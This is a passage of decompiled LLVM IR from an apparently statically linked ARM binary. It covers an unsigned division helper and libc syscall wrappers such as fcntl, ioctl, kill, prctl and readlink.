  %v1_10504 = phi i32 [ %v1_104f8, %dec_label_pc_104f4 ], [ %v3_104f8, %bb84 ]
  %v1_10508 = phi i32 [ %v1_104fc, %dec_label_pc_104f4 ], [ %v3_104fc, %bb84 ]
  %v4_10500 = udiv i32 %v1_1052c, 2
  %v6_10500 = icmp ult i32 %v1_10504, %v4_10500
  br i1 %v6_10500, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10504 = urem i32 %v1_1052c, 2
  %v4_10504 = icmp eq i32 %v3_10504, 0
  %v6_10504 = sub i32 %v1_10504, %v4_10500
  store i32 %v6_10504, i32* %r0.global-to-local, align 4
  br i1 %v4_10504, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10508 = udiv i32 %v1_10528, 2
  %v6_10508 = or i32 %v1_10508, %v5_10508
  store i32 %v6_10508, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10510 = phi i32 [ %v6_10504, %bb85 ], [ %v1_10504, %.thread7 ], [ %v6_10504, %bb86 ]
  %v1_10514 = phi i32 [ %v1_10508, %bb85 ], [ %v1_10508, %.thread7 ], [ %v6_10508, %bb86 ]
  %v4_1050c = udiv i32 %v1_1052c, 4
  %v6_1050c = icmp ult i32 %v1_10510, %v4_1050c
  br i1 %v6_1050c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10510 = and i32 %v1_1052c, 2
  %v4_10510 = icmp eq i32 %v3_10510, 0
  %v6_10510 = sub i32 %v1_10510, %v4_1050c
  store i32 %v6_10510, i32* %r0.global-to-local, align 4
  br i1 %v4_10510, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10514 = udiv i32 %v1_10528, 4
  %v6_10514 = or i32 %v1_10514, %v5_10514
  store i32 %v6_10514, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_1051c = phi i32 [ %v6_10510, %bb87 ], [ %v1_10510, %.thread8 ], [ %v6_10510, %bb88 ]
  %v1_10520 = phi i32 [ %v1_10514, %bb87 ], [ %v1_10514, %.thread8 ], [ %v6_10514, %bb88 ]
  %v4_10518 = udiv i32 %v1_1052c, 8
  %v6_10518 = icmp ult i32 %v1_1051c, %v4_10518
  br i1 %v6_10518, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_1051c = and i32 %v1_1052c, 4
  %v4_1051c = icmp eq i32 %v3_1051c, 0
  %v6_1051c = sub i32 %v1_1051c, %v4_10518
  store i32 %v6_1051c, i32* %r0.global-to-local, align 4
  br i1 %v4_1051c, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10520 = udiv i32 %v1_10528, 8
  %v6_10520 = or i32 %v1_10520, %v5_10520
  store i32 %v6_10520, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10534 = phi i32 [ %v1_10520, %bb89 ], [ %v1_10520, %.thread9 ], [ %v6_10520, %bb90 ]
  %v0_10524 = phi i32 [ %v6_1051c, %bb89 ], [ %v1_1051c, %.thread9 ], [ %v6_1051c, %bb90 ]
  %v2_10524 = icmp eq i32 %v0_10524, 0
  br i1 %v2_10524, label %dec_label_pc_10534, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10528, 16
  br i1 %tmp138, label %dec_label_pc_10534, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10528 = udiv i32 %v1_10528, 16
  %v4_1052c = udiv i32 %v1_1052c, 16
  br label %dec_label_pc_104f4

dec_label_pc_10534:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10534, i32* %r0.global-to-local, align 4
  ret i32 %v0_10534

dec_label_pc_1053c:                               ; preds = %dec_label_pc_104a8
  %v9_104a8 = icmp eq i32 %v0_104a8, %v1_104a8
  %. = zext i1 %v9_104a8 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10548:                               ; preds = %dec_label_pc_104b0
  %v2_10548 = icmp ugt i32 %v1_104a8, 65535
  br i1 %v2_10548, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10548
  %v2_1054c = and i32 %v1_104a8, 32768
  %v3_1054c = icmp eq i32 %v2_1054c, 0
  %v4_1054c = udiv i32 %v1_104a8, 65536
  br i1 %v3_1054c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10548
  %v0_1055865 = phi i32 [ %v1_104a8, %dec_label_pc_10548 ], [ %v4_1054c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1055c = phi i32 [ %v0_1055865, %.thread16 ], [ %v4_1054c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10558 = icmp ugt i32 %v1_1055c, 255
  br i1 %v2_10558, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1055c = and i32 %v1_1055c, 128
  %v3_1055c = icmp eq i32 %v2_1055c, 0
  %v4_1055c = udiv i32 %v1_1055c, 256
  br i1 %v3_1055c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10560 = or i32 %storemerge, 8
  store i32 %v2_10560, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1056c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10560, %bb98 ]
  %v1_10568 = phi i32 [ %v1_1055c, %bb96 ], [ %v4_1055c, %bb97 ], [ %v4_1055c, %bb98 ]
  %v2_10564 = icmp ugt i32 %v1_10568, 15
  br i1 %v2_10564, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10568 = and i32 %v1_10568, 8
  %v3_10568 = icmp eq i32 %v2_10568, 0
  %v4_10568 = udiv i32 %v1_10568, 16
  br i1 %v3_10568, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1056c = add nsw i32 %v1_1056c, 4
  store i32 %v2_1056c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10574 = phi i32 [ %v1_1056c, %.thread17 ], [ %v1_1056c, %bb99 ], [ %v2_1056c, %bb100 ]
  %v5_10578 = phi i32 [ %v1_10568, %.thread17 ], [ %v4_10568, %bb99 ], [ %v4_10568, %bb100 ]
  %v2_10570 = icmp ugt i32 %v5_10578, 3
  %v7_10570 = icmp eq i32 %v5_10578, 4
  %v2_10574 = xor i1 %v7_10570, true
  %v3_10574 = and i1 %v2_10570, %v2_10574
  br i1 %v3_10574, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10574 = add nsw i32 %v4_10574, 3
  store i32 %v5_10574, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10578 = phi i32 [ %v4_10574, %.thread18 ], [ %v5_10574, %bb101 ]
  %v2_10578 = xor i1 %v2_10570, true
  %v3_10578 = or i1 %v7_10570, %v2_10578
  br i1 %v3_10578, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10578 = udiv i32 %v5_10578, 2
  %v9_10578 = add i32 %v4_10578, %v8_10578
  store i32 %v9_10578, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1057c = phi i32 [ %v4_10578, %bb102 ], [ %v9_10578, %bb103 ]
  %v6_1057c = lshr i32 %v0_104a8, %v1_1057c
  store i32 %v6_1057c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1057c

dec_label_pc_10584:                               ; preds = %entry
  %v0_10588 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10578, { 1, 0 }
  uselistorder i1 %v7_10570, { 1, 0 }
  uselistorder i32 %v4_10568, { 1, 0 }
  uselistorder i32 %v1_10568, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10560, { 1, 0 }
  uselistorder i32 %v4_1055c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1055c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1054c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10524, { 1, 0 }
  uselistorder i32 %v0_10534, { 1, 0, 2 }
  uselistorder i32 %v4_10518, { 1, 0 }
  uselistorder i32 %v1_10520, { 1, 2, 0 }
  uselistorder i32 %v4_1050c, { 1, 0 }
  uselistorder i32 %v1_10514, { 1, 2, 0 }
  uselistorder i32 %v4_10500, { 1, 0 }
  uselistorder i32 %v1_10508, { 1, 2, 0 }
  uselistorder i32 %v1_1052c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_104fc, { 1, 0 }
  uselistorder i32 %v1_10528, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_104e8, { 1, 0 }
  uselistorder i32 %v3_104e4, { 1, 0 }
  uselistorder i32 %v1_104e4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_104e8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_104d4, { 1, 0 }
  uselistorder i32 %v4_104d0, { 2, 1, 0 }
  uselistorder i32 %v1_104d4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_104dc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_104a8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_104a8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_1049c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10534, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_104dcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1059c = udiv i32 %arg1, %arg2
  ret i32 %v2_1059c
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_105b8 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_105b8
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_105d4 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_105d4, 2
  br i1 %tmp, label %dec_label_pc_10610, label %dec_label_pc_105ec

dec_label_pc_105ec:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10644, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_105ec
  %v0_10604 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10638

dec_label_pc_10610:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_1062c, label %dec_label_pc_10644

dec_label_pc_1062c:                               ; preds = %dec_label_pc_10610
  %v0_10630 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10638

dec_label_pc_10638:                               ; preds = %dec_label_pc_10600, %dec_label_pc_1062c
  %storemerge2 = phi i32 [ %v0_10604, %dec_label_pc_10600 ], [ %v0_10630, %dec_label_pc_1062c ]
  %storemerge.in = load i16, i16* @global_var_21510.336, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10638 = load i32, i32* %r2.global-to-local, align 4
  %v1_10638 = sub i32 0, %v0_10638
  store i32 %v1_10638, i32* %r2.global-to-local, align 4
  %v3_1063c = add i32 %storemerge, %storemerge2
  %v4_1063c = inttoptr i32 %v3_1063c to i32*
  store i32 %v1_10638, i32* %v4_1063c, align 4
  br label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_105ec, %dec_label_pc_10610, %dec_label_pc_10638
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10638 ], [ %arg1, %dec_label_pc_10610 ], [ %arg1, %dec_label_pc_105ec ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10644, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10638, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1065c = load i32, i32* @r2, align 4
  %v9_1065c = load i32, i32* @r3, align 4
  store i32 %v9_1065c, i32* %stack_var_-4, align 4
  %v3_10660 = load i32, i32* @r4, align 4
  store i32 %v3_10660, i32* %stack_var_-32, align 4
  %v6_10660 = load i32, i32* @r5, align 4
  %v12_10660 = load i32, i32* @r7, align 4
  %v4_10670 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_10678 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10678, i32* @r3, align 4
  %v2_1067c = icmp eq i32 %v4_10670, 0
  %v0_10684 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10684, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_1065c, i32* @r4, align 4
  br i1 %v2_1067c, label %dec_label_pc_106a0, label %dec_label_pc_10694

dec_label_pc_10694:                               ; preds = %entry
  %v7_10694 = icmp eq i32 %arg2, 7
  br i1 %v7_10694, label %dec_label_pc_106e0, label %bb

bb:                                               ; preds = %dec_label_pc_10694
  %v8_10698 = icmp eq i32 %arg2, 14
  br i1 %v8_10698, label %dec_label_pc_106e0, label %dec_label_pc_106a0

dec_label_pc_106a0:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10684, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10684, -4095
  br i1 %tmp, label %dec_label_pc_106d8, label %dec_label_pc_106c0

dec_label_pc_106c0:                               ; preds = %dec_label_pc_106a0
  %v0_106c4 = call i32 @__aeabi_read_tp()
  %v3_106c8 = load i16, i16* @global_var_21510.336, align 2
  %v4_106c8 = sext i16 %v3_106c8 to i32
  store i32 %v4_106c8, i32* @r3, align 4
  %v0_106cc = load i32, i32* @r2, align 4
  %v1_106cc = sub i32 0, %v0_106cc
  store i32 %v1_106cc, i32* @r2, align 4
  %v3_106d0 = add i32 %v4_106c8, %v0_106c4
  %v4_106d0 = inttoptr i32 %v3_106d0 to i32*
  store i32 %v1_106cc, i32* %v4_106d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_106a0, %dec_label_pc_106c0
  %v0_106d8 = phi i32 [ %v0_10684, %dec_label_pc_106a0 ], [ -1, %dec_label_pc_106c0 ]
  br label %dec_label_pc_1072c

dec_label_pc_106e0:                               ; preds = %dec_label_pc_10694, %bb
  %v0_106e0 = call i32 @__libc_enable_asynccancel()
  %v0_106e4 = load i32, i32* @r7, align 4
  store i32 %v0_106e4, i32* @r1, align 4
  store i32 %v0_106e0, i32* %r6.global-to-local, align 4
  %v0_106f0 = load i32, i32* @r5, align 4
  store i32 %v0_106f0, i32* %r0.global-to-local, align 4
  store i32 %v0_106f0, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_106f0, -4095
  br i1 %tmp15, label %dec_label_pc_10720, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %dec_label_pc_106e0
  %v1_1070c = sub i32 0, %v0_106f0
  %v0_10710 = call i32 @__aeabi_read_tp()
  store i32 %v0_10710, i32* %r0.global-to-local, align 4
  %v3_10714 = load i16, i16* @global_var_21510.336, align 2
  %v4_10714 = sext i16 %v3_10714 to i32
  store i32 %v4_10714, i32* @r3, align 4
  %v3_10718 = add i32 %v4_10714, %v0_10710
  %v4_10718 = inttoptr i32 %v3_10718 to i32*
  store i32 %v1_1070c, i32* %v4_10718, align 4
  store i32 -1, i32* @r2, align 4
  %v0_10720.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_106e0, %dec_label_pc_10708
  %v0_10724 = phi i32 [ %v0_106f0, %dec_label_pc_106e0 ], [ -1, %dec_label_pc_10708 ]
  %v0_10720 = phi i32 [ %v0_106e0, %dec_label_pc_106e0 ], [ %v0_10720.pre, %dec_label_pc_10708 ]
  store i32 %v0_10720, i32* %r0.global-to-local, align 4
  store i32 %v0_10724, i32* @r7, align 4
  %v1_10728 = call i32 @__libc_disable_asynccancel(i32 %v0_10720)
  store i32 %v1_10728, i32* %r0.global-to-local, align 4
  %v0_1072c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1072c

dec_label_pc_1072c:                               ; preds = %dec_label_pc_106d8, %dec_label_pc_10720
  %v0_1072c = phi i32 [ %v0_106d8, %dec_label_pc_106d8 ], [ %v0_1072c.pre, %dec_label_pc_10720 ]
  store i32 %v0_1072c, i32* %r0.global-to-local, align 4
  %v2_10734 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10734, i32* @r4, align 4
  store i32 %v6_10660, i32* @r5, align 4
  store i32 %v12_10660, i32* @r7, align 4
  ret i32 %v0_1072c

; uselistorder directives
  uselistorder i32 %v0_1072c, { 1, 0 }
  uselistorder i32 %v0_10720, { 1, 0 }
  uselistorder i32 %v0_106f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10684, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_1072c, { 1, 0 }
  uselistorder label %dec_label_pc_10720, { 1, 0 }
  uselistorder label %dec_label_pc_106e0, { 1, 0 }
  uselistorder label %dec_label_pc_106d8, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10760 = load i32, i32* @r0, align 4
  ret i32 %v1_10760
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10764 = load i32, i32* @r3, align 4
  store i32 %v9_10764, i32* %stack_var_-4, align 4
  %v3_10768 = load i32, i32* @r4, align 4
  store i32 %v3_10768, i32* %stack_var_-32, align 4
  %v6_10768 = load i32, i32* @r5, align 4
  %v12_10768 = load i32, i32* @r7, align 4
  %v4_10778 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_10780 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10780, i32* @r3, align 4
  %v2_10784 = icmp eq i32 %v4_10778, 0
  %v0_1078c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1078c, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_10784, label %dec_label_pc_1079c, label %dec_label_pc_107d4

dec_label_pc_1079c:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_1078c, -4095
  br i1 %tmp, label %dec_label_pc_107cc, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_1079c
  %v1_107b8 = sub i32 0, %v0_1078c
  %v3_107bc = load i16, i16* @global_var_21510.336, align 2
  %v4_107bc = sext i16 %v3_107bc to i32
  store i32 %v4_107bc, i32* @r3, align 4
  %v0_107c0 = call i32 @__aeabi_read_tp()
  %v2_107c4 = load i32, i32* @r3, align 4
  %v3_107c4 = add i32 %v2_107c4, %v0_107c0
  %v4_107c4 = inttoptr i32 %v3_107c4 to i32*
  store i32 %v1_107b8, i32* %v4_107c4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_1079c, %dec_label_pc_107b4
  %v0_107cc = phi i32 [ %v0_1078c, %dec_label_pc_1079c ], [ -1, %dec_label_pc_107b4 ]
  br label %dec_label_pc_10820

dec_label_pc_107d4:                               ; preds = %entry
  %v0_107d4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_107d4, i32* %r6.global-to-local, align 4
  %v0_107e4 = load i32, i32* @r4, align 4
  store i32 %v0_107e4, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_107e4, -4095
  br i1 %tmp15, label %dec_label_pc_10814, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107d4
  %v1_10800 = sub i32 0, %v0_107e4
  %v3_10804 = load i16, i16* @global_var_21510.336, align 2
  %v4_10804 = sext i16 %v3_10804 to i32
  store i32 %v4_10804, i32* @r3, align 4
  %v0_10808 = call i32 @__aeabi_read_tp()
  store i32 %v0_10808, i32* %r0.global-to-local, align 4
  %v2_1080c = load i32, i32* @r3, align 4
  %v3_1080c = add i32 %v2_1080c, %v0_10808
  %v4_1080c = inttoptr i32 %v3_1080c to i32*
  store i32 %v1_10800, i32* %v4_1080c, align 4
  %v0_10814.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %dec_label_pc_107d4, %dec_label_pc_107fc
  %v0_10818 = phi i32 [ %v0_107e4, %dec_label_pc_107d4 ], [ -1, %dec_label_pc_107fc ]
  %v0_10814 = phi i32 [ %v0_107d4, %dec_label_pc_107d4 ], [ %v0_10814.pre, %dec_label_pc_107fc ]
  store i32 %v0_10814, i32* %r0.global-to-local, align 4
  store i32 %v0_10818, i32* @r7, align 4
  %v1_1081c = call i32 @__libc_disable_asynccancel(i32 %v0_10814)
  store i32 %v1_1081c, i32* %r0.global-to-local, align 4
  %v0_10820.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_107cc, %dec_label_pc_10814
  %v0_10820 = phi i32 [ %v0_107cc, %dec_label_pc_107cc ], [ %v0_10820.pre, %dec_label_pc_10814 ]
  store i32 %v0_10820, i32* %r0.global-to-local, align 4
  %v2_10828 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10828, i32* @r4, align 4
  store i32 %v6_10768, i32* @r5, align 4
  store i32 %v12_10768, i32* @r7, align 4
  ret i32 %v0_10820

; uselistorder directives
  uselistorder i32 %v0_10820, { 1, 0 }
  uselistorder i32 %v0_10814, { 1, 0 }
  uselistorder i32 %v0_107e4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1078c, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10820, { 1, 0 }
  uselistorder label %dec_label_pc_10814, { 1, 0 }
  uselistorder label %dec_label_pc_107cc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10844 = load i32, i32* @r7, align 4
  store i32 %v3_10844, i32* %stack_var_-8, align 4
  %v0_10850 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10850, -4095
  br i1 %tmp, label %dec_label_pc_10870, label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %entry
  %v1_1085c = sub i32 0, %v0_10850
  %v3_10860 = load i16, i16* @global_var_21510.336, align 2
  %v4_10860 = sext i16 %v3_10860 to i32
  %v0_10864 = call i32 @__aeabi_read_tp()
  %v3_10868 = add i32 %v4_10860, %v0_10864
  %v4_10868 = inttoptr i32 %v3_10868 to i32*
  store i32 %v1_1085c, i32* %v4_10868, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10870.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %entry, %dec_label_pc_10858
  %v1_10874 = phi i32 [ %v0_10850, %entry ], [ -1, %dec_label_pc_10858 ]
  %v2_10870 = phi i32 [ %v3_10844, %entry ], [ %v2_10870.pre, %dec_label_pc_10858 ]
  store i32 %v2_10870, i32* @r7, align 4
  ret i32 %v1_10874

; uselistorder directives
  uselistorder i32 %v0_10850, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10870, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1087c = load i32, i32* @r4, align 4
  store i32 %v3_1087c, i32* %stack_var_-12, align 4
  %v0_1088c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1088c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1088c, -4095
  br i1 %tmp, label %dec_label_pc_108b4, label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %entry
  %v0_108a0 = call i32 @__aeabi_read_tp()
  %v3_108a4 = load i16, i16* @global_var_21510.336, align 2
  %v4_108a4 = sext i16 %v3_108a4 to i32
  %v0_108a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_108a8 = sub i32 0, %v0_108a8
  store i32 %v1_108a8, i32* %r2.global-to-local, align 4
  %v3_108ac = add i32 %v4_108a4, %v0_108a0
  %v4_108ac = inttoptr i32 %v3_108ac to i32*
  store i32 %v1_108a8, i32* %v4_108ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_108b4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %entry, %dec_label_pc_1089c
  %v1_108b8 = phi i32 [ %v0_1088c, %entry ], [ -1, %dec_label_pc_1089c ]
  %v2_108b4 = phi i32 [ %v3_1087c, %entry ], [ %v2_108b4.pre, %dec_label_pc_1089c ]
  store i32 %v2_108b4, i32* @r4, align 4
  ret i32 %v1_108b8

; uselistorder directives
  uselistorder i32 %v0_1088c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108b4, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108c0 = load i32, i32* @r7, align 4
  store i32 %v3_108c0, i32* %stack_var_-8, align 4
  %v0_108cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_108cc, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_108cc, -4095
  br i1 %tmp, label %dec_label_pc_108f4, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %entry
  %v0_108e0 = call i32 @__aeabi_read_tp()
  %v3_108e4 = load i16, i16* @global_var_21510.336, align 2
  %v4_108e4 = sext i16 %v3_108e4 to i32
  store i32 %v4_108e4, i32* @r3, align 4
  %v0_108e8 = load i32, i32* @r2, align 4
  %v1_108e8 = sub i32 0, %v0_108e8
  store i32 %v1_108e8, i32* @r2, align 4
  %v3_108ec = add i32 %v4_108e4, %v0_108e0
  %v4_108ec = inttoptr i32 %v3_108ec to i32*
  store i32 %v1_108e8, i32* %v4_108ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
